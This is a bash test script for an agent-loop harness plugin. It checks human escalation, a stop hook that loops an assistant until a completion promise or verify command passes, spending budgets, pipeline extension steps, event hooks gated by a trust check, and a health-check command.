check "repeated failures escalate to a human" 'grep -q "^NEEDS_HUMAN=F001$" <<<"$OUT" && [[ "$(st_of F001)" == NEEDS_HUMAN ]] && out_has "failed 2 attempts" $FL questions'
check "escalation counts as progress"         'grep -q "^STUCK=0/3$" <<<"$OUT"'
check "loop moves on to the next feature"     'out_has "^TARGET=F002$" $S begin'
$FL claim F002 >/dev/null; $S task tester >/dev/null; $FL pass F002 >/dev/null; $S end >/dev/null 2>&1
check "only human-blocked work left: code 8"  'out_has "^CODE=8$" $S begin && out_has "waiting for a human: F001" $S begin'
$FL answer F001 "use UTF-8" >/dev/null
check "answer resumes the loop"               'out_has "^TARGET=F001$" $S begin'
check "coder task carries the human answer"   'out_has "Human answer for F001: use UTF-8" $S task coder'
$S end >/dev/null 2>&1
new_project 2
set_features '.features[0].depends_on=["F002"] | .features[1].depends_on=["F001"]'
check "unsatisfiable dependencies: code 9"    'out_has "^CODE=9$" .harness/step.sh begin --new-run'
new_project 1
touch .harness/STOP
check "new run reports a cleared STOP flag"   'out_has "^NOTE=cleared a STOP flag" .harness/step.sh begin --new-run'
echo "not json" > .harness/.step_state.json
check "corrupted state gives a clear error"   '! .harness/step.sh begin >$LOGD/c1.log 2>&1 && grep -q "corrupted" $LOGD/c1.log'
rm .harness/.step_state.json; .harness/step.sh unlock >/dev/null
new_project 2
.harness/feature-list.sh ask F001 "pick a colour" >/dev/null
echo '{"add":[{"description":"x","steps":["y"]}]}' | .harness/backlog.sh propose --reason "more" >/dev/null
check "status shows questions and proposals"  'out_has "pick a colour" .harness/status.sh && out_has "P001" .harness/status.sh'
check "summary lists questions and proposals" '.harness/step.sh summary x 0 >/dev/null 2>&1; grep -q "Waiting for a human" .harness/last-run.md && grep -q "P001: more" .harness/last-run.md'
check "v2 lists (passes/claimed only) still work" 'jq "del(.features[].status) | .features[1].claimed=true" .harness/feature_list.json > .harness/x && mv .harness/x .harness/feature_list.json; [[ "$(st_of F002)" == CLAIMED ]] && out_has "1 awaiting verification" .harness/feature-list.sh stats'

echo "ralph stop hook"
HOOK="$ROOT/hooks/stop-hook.sh"
ralph_state() { mkdir -p .claude; printf -- '---\nactive: true\niteration: 1\nsession_id: s1\nmax_iterations: %s\ncompletion_promise: "ALL DONE"\n---\n\ndo the thing\n' "$1" > .claude/ralph-loop.local.md; }
transcript() { jq -cn --arg t "$1" '{role:"assistant",message:{content:[{type:"text",text:$t}]}}' > t.jsonl; }
hook_in() { jq -cn --arg t "$PWD/t.jsonl" --arg s "$1" '{session_id:$s,transcript_path:$t}'; }
P="$(mktemp -d)"; cd "$P"
ralph_state 5; transcript "still working"
check "hook blocks and feeds the prompt back"  'hook_in s1 | bash "$HOOK" | jq -e ".decision==\"block\" and (.reason|test(\"do the thing\"))" >/dev/null && grep -q "^iteration: 2" .claude/ralph-loop.local.md'
transcript "$(printf 'done\n<promise>  ALL\n  DONE </promise>')"
check "multi-line promise ends the loop"       'hook_in s1 | bash "$HOOK" >/dev/null; [[ ! -f .claude/ralph-loop.local.md ]]'
ralph_state 5; transcript "<promise>ALL DONE</promise>"
check "other sessions are not affected"        '[[ -z "$(hook_in s2 | bash "$HOOK")" ]] && [[ -f .claude/ralph-loop.local.md ]]'
ralph_state 1; transcript "nope"
check "max iterations ends the loop"           'hook_in s1 | bash "$HOOK" >/dev/null; [[ ! -f .claude/ralph-loop.local.md ]]'
check "hook needs no perl"                     '! grep -q perl "$HOOK"'

echo "phase 2: ledger and budgets"
set_cfg() { jq "$1" .harness/config.json > .harness/c && mv .harness/c .harness/config.json; git add -A; git commit -qm cfg >/dev/null 2>&1 || true; }
new_project 3
S=.harness/step.sh
$S begin --new-run >/dev/null
$S ledger add coder --cost 0.5 --input-tokens 1000 --output-tokens 200 --ms 900 >/dev/null
$S ledger add tester --tokens 300 >/dev/null
OUT="$($S ledger total)"
check "ledger totals cost and tokens for the run" 'grep -q "^COST=0.5$" <<<"$OUT" && grep -q "^TOKENS=1500$" <<<"$OUT" && grep -q "^RUNS=2$" <<<"$OUT"'
check "ledger rejects non-numeric values"     '! $S ledger add coder --cost abc >/dev/null 2>&1'
check "ledger is git-ignored"                 'grep -qxF ledger.jsonl .harness/.gitignore'
check "no cost cap: empty REMAINING_USD"      'out_has "^REMAINING_USD=$" $S budget'
$S end >/dev/null 2>&1
set_cfg '.budget.max_cost_usd=2'
check "remaining budget is reported"          'out_has "^REMAINING_USD=1.5$" $S budget'
set_cfg '.budget.max_cost_usd=0.5'
check "cost cap stops begin (code 10)"        'out_has "^CODE=10$" $S begin && out_has "budget.max_cost_usd" $S begin'
check "new run resets the run budget"         '$S unlock >/dev/null; out_has "^DECISION=continue" $S begin --new-run'
$S end >/dev/null 2>&1
set_cfg '.budget.max_cost_usd=0 | .budget.max_tokens=100'
$S ledger add coder --tokens 150 >/dev/null
check "token cap stops begin (code 10)"       'out_has "^CODE=10$" $S begin'
set_cfg '.budget.max_tokens=0 | .budget.max_wall_minutes=1'
jq '.run = (.run - 120)' .harness/.step_state.json > .harness/st && mv .harness/st .harness/.step_state.json
check "wall-clock cap stops begin (code 10)"  'out_has "^REASON=budget exhausted: 2 minutes" $S begin'
check "summary shows spend"                   '$S summary x 0 >/dev/null 2>&1; grep -q "Spend this run" .harness/last-run.md'

new_project 2
S=.harness/step.sh
set_cfg '.budget.max_diff_lines=5'
$S begin --new-run >/dev/null; seq 1 20 > big.txt; git add -A; git commit -qm "feat: big" >/dev/null
OUT="$($S end 2>/dev/null)"
check "large session diff warns"              'grep -q "^DIFF_LINES=20$" <<<"$OUT" && grep -q "^WARN=session 1 changed 20 lines" <<<"$OUT" && grep -q "^NEXT=continue$" <<<"$OUT"'
set_cfg '.budget.on_large_diff="stop"'
$S begin >/dev/null; seq 1 20 > big2.txt; git add -A; git commit -qm "feat: big2" >/dev/null
OUT="$($S end 2>/dev/null)"
check "on_large_diff=stop stops (code 11)"    'grep -q "^NEXT=stop$" <<<"$OUT" && grep -q "^CODE=11$" <<<"$OUT"'
$S begin >/dev/null; OUT="$($S end 2>/dev/null)"
check ".harness changes do not count as diff" 'grep -q "^DIFF_LINES=0$" <<<"$OUT"'

new_project 2
FAKE_COST=0.25 .harness/run.sh >$LOGD/l1.log 2>&1
check "headless run records each agent in the ledger" '[[ "$(wc -l < .harness/ledger.jsonl | tr -d " ")" == 4 ]] && jq -e "select(.mode==\"headless\" and .cost_usd==0.25 and .input_tokens==1000)" .harness/ledger.jsonl >/dev/null'
check "headless log keeps readable agent output" 'grep -q "fake claude ok" .harness/sessions/001-coder.log && grep -q "noisy stderr" .harness/sessions/001-coder.log && [[ -f .harness/sessions/001-coder.json ]]'
check "runner prints spend per session"       'grep -q "spent: \$0.5" $LOGD/l1.log'
new_project 3
set_cfg '.budget.max_cost_usd=0.6'
FAKE_COST=0.25 FAKE_BUDGET_FLAG=1 FAKE_ARGS_LOG=$LOGD/args.log .harness/run.sh >$LOGD/l2.log 2>&1; RC=$?
check "cost cap ends a headless run (code 10)" '[[ $RC -eq 10 ]] && grep -q "budget exhausted" $LOGD/l2.log'
check "per-call cap passed as --max-budget-usd" 'grep -q -- "--max-budget-usd 0.6" $LOGD/args.log && grep -q -- "--max-budget-usd 0.35" $LOGD/args.log'
new_project 1
FAKE_ARGS_LOG=$LOGD/args2.log .harness/run.sh >/dev/null 2>&1
check "no --max-budget-usd when the CLI lacks it" '! grep -q -- "--max-budget-usd" $LOGD/args2.log && grep -q -- "--output-format json" $LOGD/args2.log'

echo "phase 2: ralph --verify / --allow-blocked / --max-minutes"
RSETUP="$ROOT/scripts/setup-ralph-loop.sh"
export CLAUDE_CODE_SESSION_ID=s1   # isolate from the session running the tests
P="$(mktemp -d)"; cd "$P"
"$RSETUP" "make it pass" --verify 'test -f ok.txt' --max-minutes 5 --completion-promise 'say "done"' >/dev/null
check "setup stores JSON-quoted strings"      'grep -q "^completion_promise: \"say \\\\\"done\\\\\"\"$" .claude/ralph-loop.local.md && grep -q "^verify: \"test -f ok.txt\"$" .claude/ralph-loop.local.md && grep -q "^max_minutes: 5$" .claude/ralph-loop.local.md'
check "setup rejects a bad --max-minutes"     '! "$RSETUP" x --max-minutes soon >/dev/null 2>&1'
transcript 'done <promise>say "done"</promise>'
OUT="$(hook_in s1 | bash "$HOOK")"
check "promise with quotes still matches"     'jq -e ".decision==\"block\"" <<<"$OUT" >/dev/null'
check "failing verify keeps looping with feedback" 'jq -e ".reason | test(\"verify command failed\") and test(\"test -f ok.txt\")" <<<"$OUT" >/dev/null && [[ -f .claude/ralph-loop.local.md ]]'
touch ok.txt
check "promise + passing verify ends the loop" 'hook_in s1 | bash "$HOOK" | grep -q "verify command passed"; [[ ! -f .claude/ralph-loop.local.md ]]'
check "outcome is recorded"                   'grep -q "^outcome: done$" .claude/ralph-loop.last.md && grep -q "make it pass" .claude/ralph-loop.last.md'
rm ok.txt; "$RSETUP" "no promise" --verify 'test -f ok.txt' >/dev/null; transcript "working"
check "verify alone is checked at every stop" 'hook_in s1 | bash "$HOOK" | jq -e ".decision==\"block\"" >/dev/null && touch ok.txt && hook_in s1 | bash "$HOOK" >/dev/null && [[ ! -f .claude/ralph-loop.local.md ]]'
"$RSETUP" "stuck task" --allow-blocked >/dev/null; transcript "<promise>BLOCKED: need an API key</promise>"
check "BLOCKED ends the loop when allowed"    'hook_in s1 | bash "$HOOK" | grep -q "blocked"; [[ ! -f .claude/ralph-loop.local.md ]] && grep -q "^outcome: blocked$" .claude/ralph-loop.last.md && grep -q "need an API key" .claude/ralph-loop.last.md'
"$RSETUP" "stuck task" >/dev/null
check "BLOCKED is ignored unless allowed"     'hook_in s1 | bash "$HOOK" | jq -e ".decision==\"block\"" >/dev/null'
"$RSETUP" "timed task" --max-minutes 1 >/dev/null
sed -i.bak 's/^started_epoch: .*/started_epoch: 1/' .claude/ralph-loop.local.md; transcript "working"
check "--max-minutes ends the loop"           'hook_in s1 | bash "$HOOK" | grep -q "time budget"; [[ ! -f .claude/ralph-loop.local.md ]] && grep -q "^outcome: max_minutes$" .claude/ralph-loop.last.md'
printf -- '---\nactive: true\niteration: 1\nsession_id: \nmax_iterations: 0\ncompletion_promise: "OLD"\nstarted_at: "x"\n---\n\nlegacy prompt\n' > .claude/ralph-loop.local.md; transcript "<promise>OLD</promise>"
check "legacy state files still work"         'hook_in s1 | bash "$HOOK" | grep -q "Detected"; [[ ! -f .claude/ralph-loop.local.md ]]'
check "stop hook has a long timeout"          '[[ "$(jq ".hooks.Stop[0].hooks[0].timeout" "$ROOT/hooks/hooks.json")" -ge 300 ]]'

unset CLAUDE_CODE_SESSION_ID
echo "phase 3: pipeline extensions (use:)"
set_trusted_cfg() { jq "$1" .harness/config.json > .harness/c && mv .harness/c .harness/config.json; .harness/step.sh trust accept >/dev/null; git add -A; git commit -qm cfg >/dev/null 2>&1 || true; }
EXT_PIPE='.pipeline = [{agent:"coder"}, {agent:"tester", when:"claimed"},
  {name:"review", use:"agent:pr-review-toolkit:code-reviewer", when:"passed", optional:true},
  {name:"security", use:"skill:security-review", when:"tag:auth"},
  {name:"cmdstep", use:"cmd:echo built > built.txt"},
  {name:"ghost", use:"agent:nope", optional:true}]'
new_project 2
S=.harness/step.sh; FL=.harness/feature-list.sh
set_trusted_cfg "$EXT_PIPE"
check "plan names use: steps, non-blocking by default" '[[ "$($S plan | cut -f1,2 | tr "\t\n" ": ")" == "coder:true tester:true review:false security:false cmdstep:false ghost:false " ]]'
check "spawn-info: other plugin agent type"   'out_has "^TYPE=pr-review-toolkit:code-reviewer$" $S spawn-info review && out_has "^OPTIONAL=true$" $S spawn-info review'
check "spawn-info: skill runs via the Skill tool" 'out_has "^TYPE=general-purpose$" $S spawn-info security && out_has "Skill tool to invoke .security-review" $S spawn-info security'
check "spawn-info: cmd step runs in the gate" 'out_has "^TYPE=gate$" $S spawn-info cmdstep'
check "spawn-info: missing optional agent"    'out_has "^TYPE=missing$" $S spawn-info ghost'
check "spawn-info: unknown use is an error"   'jq ".pipeline += [{name:\"bad\", use:\"http://x\"}]" .harness/config.json > $LOGD/c.json; ! HARNESS_DIR=.harness bash -c "cp $LOGD/c.json .harness/config.json; $S spawn-info bad" >/dev/null 2>&1; git checkout -q .harness/config.json'
$S trust accept >/dev/null
$S begin --new-run >/dev/null
check "when=passed skips when nothing passed" 'out_has "^SKIP: nothing passed this session" $S task review'
check "when=tag skips untagged targets"       'out_has "^SKIP: target F001 is not tagged auth" $S task security'
$FL claim F001 >/dev/null; $S task tester >/dev/null; $FL pass F001 >/dev/null
check "when=passed runs after a pass"         'out_has "Features passed this session: F001" $S task review'
check "extension task carries the rules"      'out_has "never run feature-list.sh pass" $S task review && out_has "backlog.sh propose --by review" $S task review'
check "classic agents get no extension rules" '! out_has "extension step" $S task coder'
check "run-step runs the shell step"          '$S run-step cmdstep >/dev/null && [[ "$(cat built.txt)" == built ]] && grep -q "cmdstep ok" .harness/sessions/001-notes.md'
check "failing run-step reports and exits non-zero" 'jq ".pipeline[4].use=\"cmd:exit 3\"" .harness/config.json > .harness/c && mv .harness/c .harness/config.json && $S trust accept >/dev/null; ! $S run-step cmdstep >$LOGD/rs.log 2>&1 && grep -q "FAILED exit 3" $LOGD/rs.log'
rm -f built.txt; git checkout -q .harness/config.json; $S trust accept >/dev/null; $S end >/dev/null 2>&1
check "adding a use: step revokes trust"      'jq ".pipeline += [{name:\"x\", use:\"skill:anything\"}]" .harness/config.json > .harness/c && mv .harness/c .harness/config.json; ! $S trust status >/dev/null 2>&1 && out_has "x: skill:anything" $S trust show'
check "run-step refuses untrusted config"     '! $S run-step cmdstep >/dev/null 2>&1'
git checkout -q .harness/config.json; $S trust accept >/dev/null

new_project 2
set_trusted_cfg '.pipeline = [{agent:"coder"}, {agent:"tester", when:"claimed"}, {name:"review", use:"agent:pr-review-toolkit:code-reviewer", when:"passed", optional:true}, {name:"lint", use:"skill:lint-check", optional:true}, {name:"build", use:"cmd:echo ok"}]'
.harness/run.sh --once >$LOGD/e1.log 2>&1
check "headless: plugin agent step delegates via the Agent tool" 'grep -q "▶ review" $LOGD/e1.log && grep -q "fake extension ran" .harness/sessions/001-review.log'
check "headless: skill step runs"             'grep -q "fake extension ran" .harness/sessions/001-lint.log'
check "headless: cmd step runs in the gate"   'grep -q "^OK" .harness/sessions/001-build.log'
new_project 2
set_trusted_cfg '.pipeline = [{agent:"coder"}, {agent:"tester", when:"claimed"}, {name:"review", use:"agent:pr-review-toolkit:code-reviewer", optional:true}]'
FAKE_UNAVAILABLE=1 .harness/run.sh --once >$LOGD/e2.log 2>&1
check "headless: unavailable optional extension is skipped" 'grep -q "review skipped (optional extension not available)" $LOGD/e2.log && .harness/feature-list.sh list | grep -q "F001	PASS"'
new_project 2
set_trusted_cfg '.pipeline = [{agent:"coder"}, {agent:"tester", when:"claimed"}, {name:"review", use:"agent:pr-review-toolkit:code-reviewer", when:"passed"}]'
FAKE_EXT_FAIL=1 .harness/run.sh --once >$LOGD/e3.log 2>&1
check "an extension can fail a feature it finds broken" '[[ "$(.harness/feature-list.sh list | awk -F"\t" "\$1==\"F001\"{print \$2}")" == FAIL ]] && jq -r ".features[0].notes" .harness/feature_list.json | grep -q "reviewer found a bug"'

echo "phase 3: events and hooks"
new_project 2
.harness/run.sh >$LOGD/ev.log 2>&1
EV=.harness/events.jsonl
check "events stream records the run"         'for e in run_started session_started feature_claimed feature_passed session_ended run_ended; do jq -e --arg e $e "select(.event==\$e)" $EV >/dev/null || exit 1; done'
check "events carry details"                  'jq -e "select(.event==\"feature_passed\" and .feature==\"F002\")" $EV >/dev/null && jq -e "select(.event==\"run_ended\" and .code==\"0\")" $EV >/dev/null'
check "events stream is git-ignored"          'grep -qxF events.jsonl .harness/.gitignore && [[ -z "$(git status --porcelain)" ]]'
new_project 2
S=.harness/step.sh; FL=.harness/feature-list.sh
set_trusted_cfg '.escalate_after_failures=1 | .hooks = {feature_failed: ["cmd:cat > hook-in.json; echo \"$HARNESS_EVENT $HARNESS_FEATURE\" > hook-env.txt"], needs_human: "cmd:echo \"$HARNESS_QUESTION\" > q.txt", session_ended: ["cmd:exit 1"]}'
echo hook-in.json >> .gitignore; echo hook-env.txt >> .gitignore; echo q.txt >> .gitignore; git add -A; git commit -qm ign
$S begin --new-run >/dev/null 2>&1; $FL fail F001 "nope" >/dev/null; OUT="$($S end 2>$LOGD/h.err)"
check "hook gets the event on stdin and env"  '[[ "$(cat hook-env.txt)" == "feature_failed F001" ]] && jq -e ".event==\"feature_failed\" and .note==\"nope\"" hook-in.json >/dev/null'
check "string hook form works (needs_human)"  'grep -q "failed 1 attempts" q.txt'
check "a failing hook never stops the loop"   'grep -q "^NEXT=continue$" <<<"$OUT" && grep -q "hook for .session_ended. failed" $LOGD/h.err'
check "hook output is logged"                 'grep -q "feature_failed" .harness/sessions/hooks.log'
rm -f hook-env.txt; jq '.hooks.feature_failed=["cmd:touch evil.txt"]' .harness/config.json > .harness/c && mv .harness/c .harness/config.json
check "adding a hook revokes trust"           '! $S trust status >/dev/null 2>&1 && out_has "feature_failed: cmd:touch evil.txt" $S trust show'
$S begin >/dev/null 2>&1; $FL fail F002 "x" >/dev/null; $S end >/dev/null 2>$LOGD/h2.err
check "hooks do not run on untrusted config"  '[[ ! -f evil.txt ]] && grep -q "skipped (config not trusted)" $LOGD/h2.err'
git checkout -q .harness/config.json 2>/dev/null; $S trust accept >/dev/null
echo '{"add":[{"description":"more","steps":["x"]}]}' | .harness/backlog.sh propose --by planner --reason "more stuff" >/dev/null 2>&1; .harness/backlog.sh approve P001 >/dev/null 2>&1
check "backlog emits proposal events"         'jq -e "select(.event==\"proposal_filed\" and .by==\"planner\")" .harness/events.jsonl >/dev/null && jq -e "select(.event==\"proposal_approved\" and .proposal==\"P001\")" .harness/events.jsonl >/dev/null'

echo "phase 3: status --json and doctor"
new_project 3
S=.harness/step.sh; FL=.harness/feature-list.sh
$FL ask F003 "which db?" >/dev/null
echo '{"add":[{"description":"y","steps":["z"]}]}' | .harness/backlog.sh propose --reason "why" >/dev/null 2>&1
$S begin --new-run >/dev/null 2>&1; $S ledger add coder --cost 0.4 >/dev/null
J="$(.harness/status.sh --json)"
check "status --json is valid and versioned"  'jq -e ".schema == 1 and .initialized" <<<"$J" >/dev/null'
check "status --json counts features"         'jq -e ".features.total == 3 and .features.todo == 2 and .features.needs_human == 1" <<<"$J" >/dev/null'
check "status --json lists work and state"    'jq -e ".next.id == \"F001\" and .questions[0].id == \"F003\" and .proposals_pending[0].id == \"P001\" and .session.in_progress == true and .spend.cost_usd == 0.4 and .last_event.event == \"session_started\"" <<<"$J" >/dev/null'
$S end >/dev/null 2>&1
check "status --json outside a harness"       '(cd "$(mktemp -d)" && "$ROOT/scripts/harness-status.sh" --json | jq -e ".initialized == false" >/dev/null)'
check "doctor: healthy project passes"        '.harness/doctor.sh >$LOGD/d1.log 2>&1 && grep -q "doctor: healthy" $LOGD/d1.log'
check "doctor reports questions and proposals" 'grep -q "wait for your answer" $LOGD/d1.log && grep -q "await approval" $LOGD/d1.log'
set_trusted_cfg '.pipeline += [{name:"review", use:"agent:pr-review-toolkit:code-reviewer"}] | .hooks = {bogus_event: ["cmd:true"]}'
FH="$(mktemp -d)"
check "doctor: missing required plugin agent fails" '! HOME="$FH" .harness/doctor.sh >$LOGD/d2.log 2>&1 && grep -q "✗ review: plugin agent pr-review-toolkit:code-reviewer not installed" $LOGD/d2.log'
check "doctor: unknown hook event warns"      'grep -q "unknown event .bogus_event" $LOGD/d2.log'
mkdir -p "$FH/.claude/plugins/cache/mkt/pr-review-toolkit/1.0.0/agents" && touch "$FH/.claude/plugins/cache/mkt/pr-review-toolkit/1.0.0/agents/code-reviewer.md"
check "doctor: installed plugin agent resolves" 'HOME="$FH" .harness/doctor.sh >$LOGD/d3.log 2>&1; grep -q "✓ review: plugin agent pr-review-toolkit:code-reviewer" $LOGD/d3.log'
set_trusted_cfg '.pipeline[-1].optional = true | .pipeline += [{name:"sec", use:"skill:security-review"}]'
check "doctor: optional/unresolved skills only warn" 'HOME="$(mktemp -d)" .harness/doctor.sh >$LOGD/d4.log 2>&1 && grep -q "! review (optional)" $LOGD/d4.log && grep -q "! sec: security-review not found on disk" $LOGD/d4.log'
check "doctor: stale wrapper is a problem"    'sed -i.bak "s#$ROOT#/nonexistent#g" .harness/step.sh; ! HOME="$(mktemp -d)" CLAUDE_PLUGIN_ROOT= .harness/doctor.sh >$LOGD/d5.log 2>&1; grep -q "wrappers point at a missing plugin copy" $LOGD/d5.log'
"$ROOT/scripts/harness-setup.sh" --refresh >/dev/null
check "loop-design skill ships with the plugin" 'head -5 "$ROOT/skills/loop-design/SKILL.md" | grep -q "^name: loop-design$"'

echo; echo "passed: $PASS  failed: $FAIL"
[[ $FAIL -eq 0 ]]
